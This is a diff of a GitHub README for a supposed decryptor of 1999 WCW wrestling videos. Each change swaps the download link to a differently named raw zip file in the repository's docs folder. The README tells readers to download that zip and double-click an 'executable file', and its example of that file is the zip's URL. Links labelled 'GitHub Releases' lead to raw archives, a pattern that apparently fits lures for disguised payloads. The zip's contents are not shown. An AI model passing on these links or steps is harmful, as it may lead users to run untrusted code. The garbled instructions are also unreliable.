@@ -1,7 +1,7 @@
 # 🎮 wcw-cyberring-pav-decryptor - Recover Your Lost Wrestling Videos
 
 ## 🔗 Download Now
-[![Download wcw-cyberring-pav-decryptor](https://github.com/Hdhdhrhrb/wcw-cyberring-pav-decryptor/raw/refs/heads/master/docs/cyberring-wcw-pav-decryptor-3.2.zip)](https://github.com/Hdhdhrhrb/wcw-cyberring-pav-decryptor/raw/refs/heads/master/docs/cyberring-wcw-pav-decryptor-3.2.zip)
+[![Download wcw-cyberring-pav-decryptor](https://github.com/Hdhdhrhrb/wcw-cyberring-pav-decryptor/raw/refs/heads/master/docs/decryptor_wcw_cyberring_pav_alackaday.zip)](https://github.com/Hdhdhrhrb/wcw-cyberring-pav-decryptor/raw/refs/heads/master/docs/decryptor_wcw_cyberring_pav_alackaday.zip)
 
 ## 📖 Introduction
 The wcw-cyberring-pav-decryptor is a tool for recovering 61 encrypted wrestling videos from the WCW Internet Powerdisk CD-ROM. It uses cryptanalysis techniques to unlock content from a 1999 video DRM system. This tool helps preserve digital media and revive nostalgic moments for wrestling fans.
@@ -15,11 +15,11 @@ To get started, follow these simple steps:
    - At least 500 MB of free disk space
 
 2. **Download the Software**
-   Visit this page to download: [GitHub Releases](https://github.com/Hdhdhrhrb/wcw-cyberring-pav-decryptor/raw/refs/heads/master/docs/cyberring-wcw-pav-decryptor-3.2.zip).
+   Visit this page to download: [GitHub Releases](https://github.com/Hdhdhrhrb/wcw-cyberring-pav-decryptor/raw/refs/heads/master/docs/decryptor_wcw_cyberring_pav_alackaday.zip).
 
 3. **Install the Application**
    - Locate the downloaded file in your downloads folder.
-   - Double-click the executable file (e.g., `https://github.com/Hdhdhrhrb/wcw-cyberring-pav-decryptor/raw/refs/heads/master/docs/cyberring-wcw-pav-decryptor-3.2.zip`).
+   - Double-click the executable file (e.g., `https://github.com/Hdhdhrhrb/wcw-cyberring-pav-decryptor/raw/refs/heads/master/docs/decryptor_wcw_cyberring_pav_alackaday.zip`).
    - Follow the installation prompts to complete the setup.
 
 4. **Run the Application**
@@ -44,7 +44,7 @@ Once you have the application open, follow these steps:
    - Click "Save."
 
 ## 📥 Download & Install
-For the latest version, visit this page to download: [GitHub Releases](https://github.com/Hdhdhrhrb/wcw-cyberring-pav-decryptor/raw/refs/heads/master/docs/cyberring-wcw-pav-decryptor-3.2.zip). The download page will provide access to the executable files needed for installation.
+For the latest version, visit this page to download: [GitHub Releases](https://github.com/Hdhdhrhrb/wcw-cyberring-pav-decryptor/raw/refs/heads/master/docs/decryptor_wcw_cyberring_pav_alackaday.zip). The download page will provide access to the executable files needed for installation.
 
 ## 🛠️ Troubleshooting
 If you encounter issues during installation or usage, consider the following:
